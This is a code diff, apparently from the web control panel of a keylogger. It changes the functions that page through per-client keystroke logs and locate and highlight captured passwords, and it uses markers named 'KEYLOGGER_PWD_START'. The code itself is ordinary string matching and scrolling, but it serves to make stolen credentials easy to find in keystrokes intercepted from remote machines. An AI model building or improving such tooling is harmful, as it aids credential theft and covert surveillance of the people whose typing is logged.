@@ -798,12 +798,11 @@ function renderLogsTable(logs, clientId) {
 }
 
 async function viewLog(clientId, filename, options = {}) {
-    const { password = '', rawPassword = '' } = options;  // 解构参数
+    const { password = '', rawPassword = '' } = options;
     try {
         const response = await fetch(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}/raw`);
         const content = await response.text();
 
-        // 保存全局状态
         currentLogContent = content;
         currentLogClientId = clientId;
         currentLogFilename = filename;
@@ -811,29 +810,58 @@ async function viewLog(clientId, filename, options = {}) {
         currentLogHighlightRaw = rawPassword || '';
         currentLogScrollTarget = rawPassword || password || '';
 
-        // 智能页码定位
         if (currentLogScrollTarget) {
-            // 先尝试精确匹配
-            let searchText = currentLogScrollTarget.replace(/↵/g, '\n');
-            let index = content.indexOf(searchText);
-            
-            // 如果精确匹配失败，尝试模糊匹配（移除按键标记）
-            if (index === -1 && rawPassword) {
-                searchText = rawPassword.replace(/↵/g, '').replace(/\[[^\]]+\]/g, '').trim();
-                if (searchText) {
-                    index = content.indexOf(searchText);
+            const lines = content.split('\n');
+            let targetLineIndex = -1;
+
+            if (rawPassword) {
+                const normalizedRaw = rawPassword.replace(/↵/g, '\n');
+                for (let i = 0; i < lines.length; i++) {
+                    if (lines[i].includes(normalizedRaw) || normalizedRaw.includes(lines[i])) {
+                        targetLineIndex = i;
+                        break;
+                    }
                 }
             }
-            
-            // 如果还失败，尝试匹配解析后的密码
-            if (index === -1 && password) {
-                index = content.indexOf(password);
+
+            if (targetLineIndex === -1 && rawPassword) {
+                const keyFragment = rawPassword
+                    .replace(/↵/g, '')
+                    .replace(/\[[^\]]+\]/g, '')
+                    .replace(/^_/, '')
+                    .trim();
+                
+                if (keyFragment && keyFragment.length >= 3) {
+                    for (let i = 0; i < lines.length; i++) {
+                        if (lines[i].includes(keyFragment)) {
+                            targetLineIndex = i;
+                            break;
+                        }
+                    }
+                }
             }
-            
-            if (index !== -1) {
-                const before = content.substring(0, index);
-                const lineNumber = before.split('\n').length;
-                currentLogPage = Math.max(1, Math.ceil(lineNumber / LOG_PAGE_SIZE));
+
+            if (targetLineIndex === -1 && password) {
+                for (let i = 0; i < lines.length; i++) {
+                    if (lines[i].includes(password)) {
+                        targetLineIndex = i;
+                        break;
+                    }
+                }
+            }
+
+            if (targetLineIndex === -1 && password) {
+                const simpleFragment = password.substring(0, Math.min(8, password.length));
+                for (let i = 0; i < lines.length; i++) {
+                    if (lines[i].includes(simpleFragment)) {
+                        targetLineIndex = i;
+                        break;
+                    }
+                }
+            }
+
+            if (targetLineIndex !== -1) {
+                currentLogPage = Math.max(1, Math.ceil((targetLineIndex + 1) / LOG_PAGE_SIZE));
             } else {
                 currentLogPage = 1;
             }
@@ -1275,24 +1303,61 @@ function renderLogPage() {
     const pwdStart = '[[[KEYLOGGER_PWD_START]]]';
     const pwdEnd = '[[[KEYLOGGER_PWD_END]]]';
 
-    // 处理原始密码高亮（优先）
+    // 处理原始密码高亮（优先）- 使用逐行匹配策略
     let rawHighlighted = false;
     if (currentLogHighlightRaw) {
-        // 策略1：精确匹配 - 将 ↵ 替换为 \n 进行精确匹配
-        let rawSearchText = currentLogHighlightRaw.replace(/↵/g, '\n');
-        let rawPattern = escapeRegexSpecialChars(rawSearchText).replace(/\n/g, '(?:\\r\\n|\\n|\\r)');
-        let rawRegex = new RegExp(rawPattern, 'gi');
-        let replaced = content.replace(rawRegex, (match) => { rawHighlighted = true; return `${rawStart}${match}${rawEnd}`; });
-        content = replaced;
-
-        // 策略2：如果精确匹配失败，尝试模糊匹配（移除特殊标记）
+        // 将原始数据按 ↵ 分割成多个片段
+        const rawFragments = currentLogHighlightRaw.split('↵').filter(f => f.trim());
+        
+        // 尝试在日志的每一行中匹配这些片段
+        const contentLines = content.split('\n');
+        const highlightRanges = [];
+        
+        for (const fragment of rawFragments) {
+            const cleanFragment = fragment.trim();
+            if (cleanFragment.length < 2) continue;
+            
+            for (let i = 0; i < contentLines.length; i++) {
+                const line = contentLines[i];
+                // 检查这一行是否包含该片段（使用宽松匹配）
+                if (line.includes(cleanFragment) || cleanFragment.includes(line.trim())) {
+                    highlightRanges.push({ lineIndex: i, fragment: cleanFragment });
+                    break;
+                }
+            }
+        }
+        
+        // 如果找到了足够的匹配片段，进行高亮
+        if (highlightRanges.length > 0) {
+            // 对每个匹配的行进行高亮
+            highlightRanges.forEach(({ lineIndex, fragment }) => {
+                const escapedFragment = escapeRegexSpecialChars(fragment);
+                const lineRegex = new RegExp(escapeRegexSpecialChars(fragment), 'gi');
+                contentLines[lineIndex] = contentLines[lineIndex].replace(
+                    lineRegex,
+                    (match) => `${rawStart}${match}${rawEnd}`
+                );
+                rawHighlighted = true;
+            });
+            content = contentLines.join('\n');
+        }
+        
+        // 如果上述策略失败，尝试整体模糊匹配
         if (!rawHighlighted) {
-            rawSearchText = currentLogHighlightRaw.replace(/↵/g, '').replace(/\[[^\]]+\]/g, '').trim();
-            if (rawSearchText) {
-                rawPattern = escapeRegexSpecialChars(rawSearchText);
-                rawRegex = new RegExp(rawPattern, 'gi');
-                replaced = content.replace(rawRegex, (match) => { rawHighlighted = true; return `${rawStart}${match}${rawEnd}`; });
-                content = replaced;
+            // 提取关键片段（去除按键标记）
+            const keyFragment = currentLogHighlightRaw
+                .replace(/↵/g, '')
+                .replace(/\[[^\]]+\]/g, '')
+                .replace(/^_/, '')
+                .trim();
+            
+            if (keyFragment && keyFragment.length >= 3) {
+                const escapedKey = escapeRegexSpecialChars(keyFragment);
+                const keyRegex = new RegExp(escapedKey, 'gi');
+                content = content.replace(keyRegex, (match) => {
+                    rawHighlighted = true;
+                    return `${rawStart}${match}${rawEnd}`;
+                });
             }
         }
     }
@@ -1302,11 +1367,12 @@ function renderLogPage() {
     if (currentLogHighlightPassword) {
         const shouldAttemptPassword = currentLogHighlightPassword !== currentLogHighlightRaw || !rawHighlighted;
         if (shouldAttemptPassword) {
-            const replaced = content.replace(
-                new RegExp(escapeRegexSpecialChars(currentLogHighlightPassword), 'gi'),
-                (match) => { pwdHighlighted = true; return `${pwdStart}${match}${pwdEnd}`; }
-            );
-            content = replaced;
+            const escapedPwd = escapeRegexSpecialChars(currentLogHighlightPassword);
+            const pwdRegex = new RegExp(escapedPwd, 'gi');
+            content = content.replace(pwdRegex, (match) => {
+                pwdHighlighted = true;
+                return `${pwdStart}${match}${pwdEnd}`;
+            });
         }
     }
 
@@ -1351,36 +1417,15 @@ function renderLogPage() {
         }
     }
 
-    // 步骤 6：自动滚动到高亮区域 - 更智能的定位
-    if (currentLogScrollTarget) {
-        setTimeout(() => {
-            let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
-            if (highlight) {
-                highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                highlight.classList.add('blink');
-                setTimeout(() => highlight.classList.remove('blink'), 2000);
-            } else {
-                // 如果没有高亮，尝试搜索原始文本中的关键片段
-                let searchFragment = currentLogScrollTarget.replace(/↵/g, '');
-                // 移除按键标记，只保留可打印字符
-                searchFragment = searchFragment.replace(/\[[^\]]+\]/g, '').substring(0, 50);
-                if (searchFragment && searchFragment.trim()) {
-                    const contentText = logContentEl.textContent || '';
-                    const index = contentText.indexOf(searchFragment);
-                    if (index !== -1) {
-                        // 计算大致滚动位置
-                        const linesBefore = contentText.substring(0, index).split('\n').length;
-                        const approxScroll = Math.max(0, (linesBefore - 5) * 16);
-                        logContentEl.scrollTop = approxScroll;
-                    } else {
-                        logContentEl.scrollTop = 0;
-                    }
-                } else {
-                    logContentEl.scrollTop = 0;
-                }
-            }
-        }, 100);
-    }
+    // 步骤 6：自动滚动到高亮区域
+    setTimeout(() => {
+        const highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
+        if (highlight) {
+            highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            highlight.classList.add('blink');
+            setTimeout(() => highlight.classList.remove('blink'), 2000);
+        }
+    }, 100);
 }
 
 function changeLogPage(delta) {
